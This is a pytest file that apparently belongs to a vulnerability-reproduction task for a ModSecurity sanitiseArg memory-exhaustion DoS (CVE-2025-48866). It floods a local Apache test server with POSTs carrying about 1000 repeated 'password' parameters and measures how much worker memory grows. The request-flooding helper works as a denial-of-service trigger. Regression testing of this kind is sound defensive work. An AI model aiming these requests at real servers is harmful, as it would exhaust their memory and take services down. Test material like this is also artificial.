#!/usr/bin/env python3
"""
Vulnerability Tests for CVE-2025-48866 - ModSecurity sanitiseArg DoS

These tests verify the vulnerability status:
- FAIL in vulnerable state (vulnerability is exploitable - excessive resource consumption detected)
- PASS in fixed state (vulnerability is mitigated - normal resource consumption)

The vulnerability causes excessive memory consumption when:
1. Multiple ModSecurity rules use sanitiseArg on the same parameter
2. A request contains many parameters with that same name
3. Audit logging is enabled

The vulnerable code adds arguments to the sanitization table without checking
if they were already added by a previous rule, causing O(R*N) entries where
R is the number of rules and N is the number of matching parameters.

KEY INSIGHT: This vulnerability manifests as MEMORY CONSUMPTION, not CPU time.
The server may still respond quickly, but memory grows excessively with each
request and is NOT released, causing a memory exhaustion DoS.
"""

import pytest
import requests
import subprocess
import time
import os

# Base URL for the test server
BASE_URL = os.environ.get("TEST_URL", "http://localhost:8080")
TEST_ENDPOINT = f"{BASE_URL}/test.php"

# Thresholds for detecting vulnerability
# Memory consumption is the primary indicator for this CVE
MEMORY_INCREASE_THRESHOLD = 50  # MB - memory increase per attack batch that indicates vulnerability


def get_apache_memory_mb():
    """Get total memory usage of Apache processes in MB"""
    try:
        # Use a simple approach that avoids shell escaping issues
        result = subprocess.run(
            ["ps", "aux"],
            capture_output=True,
            text=True,
            timeout=10
        )
        total_kb = 0
        for line in result.stdout.split('\n'):
            if 'apache2' in line or 'httpd' in line:
                if 'grep' not in line:
                    parts = line.split()
                    if len(parts) >= 6:
                        try:
                            total_kb += int(parts[5])  # RSS column
                        except ValueError:
                            pass
        return total_kb / 1024  # Convert to MB
    except Exception as e:
        print(f"Warning: Could not get memory usage: {e}")
        return 0


def send_attack_request(param_name="password", count=500, timeout=60):
    """
    Send a request with many repeated parameters to trigger the vulnerability.
    Uses Connection: close to ensure different Apache workers handle requests.

    Args:
        param_name: Parameter name that matches sanitiseArg rule
        count: Number of repeated parameters
        timeout: Request timeout in seconds

    Returns:
        Tuple of (success, response_time_seconds, status_code)
    """
    payload = [(param_name, f"value_{i}") for i in range(count)]
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "close"  # Force new worker for each request
    }

    try:
        start_time = time.time()
        response = requests.post(
            TEST_ENDPOINT,
            data=payload,
            headers=headers,
            timeout=timeout
        )
        elapsed = time.time() - start_time
        return True, elapsed, response.status_code
    except requests.exceptions.Timeout:
        return False, timeout, None
    except requests.exceptions.ConnectionError:
        return False, None, None


class TestSanitiseArgMemoryVulnerability:
    """
    Tests for the sanitiseArg DoS vulnerability.

    This CVE is about MEMORY CONSUMPTION, not response time.
    The vulnerability causes excessive memory allocation in Apache workers
    that is NOT released after the request completes, leading to memory
    exhaustion DoS.
    """

    def test_memory_growth_with_attack_requests(self):
        """
        Primary test: Verify that attack requests cause excessive memory growth.

        In vulnerable state: Memory grows significantly with each request
        and is NOT released, eventually leading to OOM.

        In fixed state: Memory is properly managed and doesn't grow excessively.
        """
        # Get baseline memory
        baseline_mem = get_apache_memory_mb()
        print(f"\nBaseline memory: {baseline_mem:.1f}MB")

        # Send attack requests - use Connection: close to hit different workers
        num_requests = 5
        params_per_request = 1000

        for i in range(num_requests):
            success, elapsed, status = send_attack_request(
                param_name="password",
                count=params_per_request,
                timeout=45
            )
            if not success:
                pytest.fail(f"Request {i+1} failed - vulnerability may have crashed the server")
            time.sleep(0.2)

        # Allow memory to stabilize
        time.sleep(1)

        # Get final memory
        final_mem = get_apache_memory_mb()
        mem_increase = final_mem - baseline_mem
        print(f"Final memory: {final_mem:.1f}MB")
        print(f"Memory increase: {mem_increase:.1f}MB")

        # In vulnerable version, we expect 50+ MB increase from 5 requests with 1000 params
        # each request leaks approximately 50-60MB due to the unbounded sanitization table
        if mem_increase > MEMORY_INCREASE_THRESHOLD:
            pytest.fail(
                f"VULNERABILITY DETECTED: Memory increased by {mem_increase:.1f}MB "
                f"(from {baseline_mem:.1f}MB to {final_mem:.1f}MB). "
                f"The sanitiseArg action is causing excessive memory consumption."
            )

    def test_memory_accumulates_across_workers(self):
        """
        Test that memory accumulates across Apache worker processes.

        The vulnerability causes each worker to retain memory from attack requests.
        Unlike per-request memory which may be released, worker pool memory
        accumulates across multiple requests.
        """
        # Get baseline
        baseline_mem = get_apache_memory_mb()

        # Send multiple requests to hit different workers
        # Connection: close ensures each goes to a potentially different worker
        for i in range(4):
            success, elapsed, status = send_attack_request(
                param_name="password",
                count=1000,
                timeout=45
            )
            assert success, f"Request {i+1} failed"
            time.sleep(0.3)

        # Wait a bit for any cleanup
        time.sleep(2)

        # Check memory after all requests
        final_mem = get_apache_memory_mb()
        mem_increase = final_mem - baseline_mem

        print(f"\nBaseline: {baseline_mem:.1f}MB")
        print(f"After 4 requests + 2s wait: {final_mem:.1f}MB (increase: {mem_increase:.1f}MB)")

        # In vulnerable version, memory accumulates across workers and isn't fully released
        if mem_increase > MEMORY_INCREASE_THRESHOLD:
            pytest.fail(
                f"VULNERABILITY DETECTED: Memory increase ({mem_increase:.1f}MB) "
                f"persisted after multiple requests. The worker pool is accumulating "
                f"memory from the sanitization table entries."
            )

    def test_cumulative_memory_exhaustion(self):
        """
        Test that repeated attacks cause cumulative memory growth.

        This simulates a real DoS attack where multiple requests accumulate
        memory until the server runs out of resources.
        """
        # Get initial memory
        initial_mem = get_apache_memory_mb()
        memory_readings = [initial_mem]

        # Send 3 batches of attacks
        for batch in range(3):
            # Send 3 requests per batch
            for i in range(3):
                success, elapsed, status = send_attack_request(
                    param_name="password",
                    count=800,
                    timeout=45
                )
                if not success:
                    pytest.fail(f"Request failed in batch {batch+1}, request {i+1}")
                time.sleep(0.1)

            # Record memory after each batch
            time.sleep(0.5)
            current_mem = get_apache_memory_mb()
            memory_readings.append(current_mem)
            print(f"After batch {batch+1}: {current_mem:.1f}MB")

        # Analyze memory growth pattern
        total_increase = memory_readings[-1] - memory_readings[0]

        # Check for cumulative growth (memory should keep increasing)
        # In fixed version, memory would stabilize
        if total_increase > MEMORY_INCREASE_THRESHOLD * 2:
            pytest.fail(
                f"VULNERABILITY DETECTED: Cumulative memory increase of {total_increase:.1f}MB "
                f"detected over {len(memory_readings)-1} batches. "
                f"Memory readings: {[f'{m:.1f}MB' for m in memory_readings]}"
            )


class TestSanitiseArgParameterBehavior:
    """
    Test vulnerability behavior with different parameters.
    """

    def test_password_parameter_memory_impact(self):
        """
        Test memory impact with 'password' parameter (explicitly in sanitiseArg rules).
        """
        baseline_mem = get_apache_memory_mb()

        # Send requests with password parameter
        for i in range(3):
            success, elapsed, status = send_attack_request(
                param_name="password",
                count=1000,
                timeout=45
            )
            assert success, f"Request {i+1} failed"
            time.sleep(0.2)

        time.sleep(0.5)
        final_mem = get_apache_memory_mb()
        mem_increase = final_mem - baseline_mem

        if mem_increase > MEMORY_INCREASE_THRESHOLD:
            pytest.fail(
                f"VULNERABILITY DETECTED with 'password' parameter: "
                f"Memory increased by {mem_increase:.1f}MB"
            )



class TestServerStabilityUnderAttack:
    """
    Test that the server becomes unstable under sustained attack.
    """

    def test_server_stability_during_attack(self):
        """
        Verify server remains responsive (but vulnerable) during attack.

        The vulnerability doesn't immediately crash the server - it gradually
        consumes memory until the system runs out of resources.
        """
        baseline_mem = get_apache_memory_mb()

        # Send several attack requests with large payloads
        successful_requests = 0
        for i in range(5):
            success, elapsed, status = send_attack_request(
                param_name="password",
                count=1000,  # Large payload to ensure memory impact
                timeout=45
            )
            if success and status == 200:
                successful_requests += 1
            time.sleep(0.2)

        final_mem = get_apache_memory_mb()
        mem_increase = final_mem - baseline_mem

        # Server should still be working (not crashed)
        assert successful_requests >= 4, \
            f"Only {successful_requests}/5 requests succeeded - server may be unstable"

        # But memory should be elevated if vulnerable
        # Using a smaller threshold since this test may run after others
        if mem_increase > MEMORY_INCREASE_THRESHOLD * 0.5:
            pytest.fail(
                f"VULNERABILITY DETECTED: Server handled {successful_requests}/5 requests "
                f"but memory increased by {mem_increase:.1f}MB - eventual OOM likely"
            )


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
